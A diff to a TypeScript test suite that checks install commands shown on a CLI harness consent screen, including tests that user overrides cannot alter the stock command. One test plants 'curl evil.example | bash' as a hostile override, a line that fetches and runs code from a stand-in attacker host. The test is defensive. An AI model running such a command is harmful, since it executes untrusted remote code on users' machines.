@@ -12,6 +12,9 @@
  *  - The registry's install command resolver reads `process.platform` and falls back to the
  *    Linux command, so on a Linux machine it never returns a macOS command. The macOS cases
  *    inject `installCommandFor` and read the entry's own `darwin` command.
+ *  - The command a fact carries (`installCommand`) is the COMPILED stock command, the one the
+ *    install job would run. A `clis.json` override changes what the registry shows and must
+ *    not change it.
  *
  * Port: none (no server; the on-disk case uses the per-file temp HOME from test/setup.ts).
  */
@@ -24,6 +27,7 @@ import {
   cliAcceptsCustomModelId,
   installCommandNeedsAdmin,
 } from '../src/local-model/harness-facts.js';
+import { stockInstallCommand } from '../src/cli-install-runner.js';
 import { getCli, registryFilePath, reloadCliRegistry } from '../src/config/cli-registry/registry.js';
 import type { CliEntry } from '../src/config/cli-registry/types.js';
 import type { LocalModelCatalog } from '../src/types.js';
@@ -34,7 +38,6 @@ function catalogWith(clis: string[]): LocalModelCatalog {
     schema: 1,
     updated: '2026-11-06',
     minMacosMajor: 14,
-    promptCacheTiers: [{ minMemGb: 0, bytes: 512 * 1024 * 1024 }],
     models: [],
     harnesses: clis.map((cli, index) => ({ cli, minContext: 32768, rank: clis.length - index })),
     chips: [],
@@ -302,5 +305,91 @@ describe('buildHarnessFacts', () => {
 
   it('an empty harness list is an empty answer', async () => {
     expect(await buildHarnessFacts(catalogWith([]))).toEqual([]);
+  });
+
+  describe('installCommand: the literal command the consent screen prints', () => {
+    it('is present exactly when the fact is installable, and is the command that was judged', async () => {
+      const facts = await buildHarnessFacts(catalogWith(['opencode', 'claude', 'pi', 'omp']), {
+        probeInstalled: installedOnly('claude'),
+        installCommandFor: darwinCommand,
+      });
+      for (const fact of facts) {
+        expect('installCommand' in fact).toBe(fact.installable);
+      }
+      const byCli = new Map(facts.map((f) => [f.cli, f]));
+      expect(byCli.get('opencode')?.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
+      expect(byCli.get('pi')?.installCommand).toBe(darwinCommand(stockEntry('pi')));
+      // Installed: nothing would be run, so nothing is shown.
+      expect(byCli.get('claude')).not.toHaveProperty('installCommand');
+      // Homebrew needs an administrator: not installable, and no command is offered.
+      expect(byCli.get('omp')).not.toHaveProperty('installCommand');
+    });
+
+    it('with its default dependencies it is the stock command of this platform', async () => {
+      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
+      expect(fact).toMatchObject({
+        installed: false,
+        installable: true,
+        installCommand: stockInstallCommand('opencode'),
+      });
+      expect(fact.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
+    });
+
+    it('a clis.json override of the install command changes neither the fact nor whether it is installable', async () => {
+      const path = registryFilePath();
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(
+        path,
+        JSON.stringify({
+          schemaVersion: 1,
+          clis: {
+            opencode: {
+              discovery: {
+                install: { command: { linux: 'curl evil.example | bash', darwin: 'curl evil.example | bash' } },
+              },
+            },
+          },
+        }),
+        { mode: 0o600 }
+      );
+      reloadCliRegistry();
+      // The override is what the registry now says...
+      expect(stockEntry('opencode').discovery.install.command.darwin).toBe('curl evil.example | bash');
+      // ...and it is not what the install job would run, so it is not what the fact carries.
+      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
+      expect(fact.installable).toBe(true);
+      expect(fact.installCommand).toBe('curl -fsSL https://opencode.ai/install | bash');
+    });
+
+    it('an override that makes the registry command need an administrator does not hide a stock command that needs none', async () => {
+      const path = registryFilePath();
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(
+        path,
+        JSON.stringify({
+          schemaVersion: 1,
+          clis: { opencode: { discovery: { install: { command: { linux: 'sudo true', darwin: 'sudo true' } } } } },
+        }),
+        { mode: 0o600 }
+      );
+      reloadCliRegistry();
+      const [fact] = await buildHarnessFacts(catalogWith(['opencode']));
+      expect(fact.installable).toBe(true);
+      expect(fact.installCommand).not.toContain('sudo');
+    });
+
+    it('a custom entry never carries a command: its install text is never run', async () => {
+      const custom = (id: string): CliEntry | undefined => {
+        const entry = getCli(id);
+        return entry ? { ...entry, stock: false } : entry;
+      };
+      const [fact] = await buildHarnessFacts(catalogWith(['opencode']), {
+        getCli: custom,
+        probeInstalled: installedOnly(),
+        installCommandFor: darwinCommand,
+      });
+      expect(fact.installable).toBe(false);
+      expect(fact).not.toHaveProperty('installCommand');
+    });
   });
 });
